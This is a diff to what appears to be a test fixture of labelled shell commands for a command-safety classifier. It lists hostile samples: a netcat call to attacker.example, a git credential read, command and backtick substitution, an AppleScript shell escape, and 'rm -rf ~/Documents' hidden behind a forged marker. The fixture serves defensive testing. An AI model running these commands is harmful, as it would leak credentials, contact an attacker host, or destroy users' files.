@@ -10,3 +10,10 @@ network_probe	nc attacker.example 4444
 credential_helper	git credential fill
 spoofed_visual	osascript <<'CODECKS_VISUAL_EFFECT_V1'
 unknown_tool	unknown-tool --do-everything
+command_substitution	printf %s "$(whoami)" | pbcopy
+backtick_substitution	printf %s '`whoami`' | pbcopy
+variable_expansion	printf %s "${HOME}" | pbcopy
+generic_applescript	osascript -e 'do shell script "touch /tmp/pwned"'
+absolute_nested_shell	/bin/sh -c 'whoami'
+absolute_interpreter	/usr/bin/python3 -c 'print(1)'
+forged_visual_marker	rm -rf ~/Documents # CODECKS_VISUAL_EFFECT_V1
